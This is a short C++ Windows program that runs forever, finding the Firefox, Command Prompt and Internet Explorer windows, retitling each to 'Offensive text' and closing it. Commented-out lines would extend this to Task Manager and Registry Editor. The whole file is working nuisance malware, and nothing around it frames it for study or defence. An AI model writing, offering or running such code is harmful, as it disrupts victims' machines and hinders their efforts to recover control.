#pragma runtime_checks( "[runtime_checks]", off )
 
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <conio.h>
#include <ctime>
using namespace std;

int random, Freq, Dur, X, Y;
HWND mywindow, ie, CMD, notepad;

DWORD WINAPI DestroyWindows(LPVOID);

int main(){
    DestroyWindows(NULL);
}


DWORD WINAPI DestroyWindows(LPVOID){
      while(1)
      {
            //   TaskMgr = FindWindow(NULL,"Task Manger");  // Needs admin privilege
              notepad = FindWindow("MozillaWindowClass",NULL);
              CMD = FindWindow(NULL, "Command Prompt");
            //   Regedit = FindWindow(NULL,"Registry Editor");  // Needs admin privilege
              ie = FindWindow(NULL,"Internet Explorer");
              if( notepad != NULL )
              {
                  SetWindowText( notepad, "Offensive text");
                  PostMessage( notepad, WM_CLOSE, (LPARAM)0, (WPARAM)0);
              }
              if( CMD != NULL )
              {
                  SetWindowText( CMD, "Offensive text");
                  PostMessage( CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
              }   
              if( ie != NULL )
              {
                  SetWindowText( ie, "Offensive text");
                  PostMessage( ie, WM_CLOSE, (LPARAM)0, (WPARAM)0);
              }  
              
              Sleep(100);
      }
}
